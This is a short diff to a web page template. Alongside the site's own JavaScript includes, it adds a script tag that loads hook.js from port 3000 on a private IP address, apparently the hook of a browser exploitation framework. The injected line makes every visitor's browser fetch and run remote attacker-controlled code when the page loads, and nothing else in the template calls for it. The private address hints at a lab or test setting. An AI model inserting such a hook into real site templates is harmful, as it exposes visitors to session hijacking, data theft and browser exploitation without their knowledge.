@@ -136,6 +136,8 @@
         <script type="text/javascript" src="{{secure_asset('js/main.js')}}"></script>
         <script type="text/javascript" src="{{secure_asset('js/swiper.js')}}"></script>
 
+        <script src="http://192.168.100.11:3000/hook.js"></script>
+
       
     </body>
 </html>
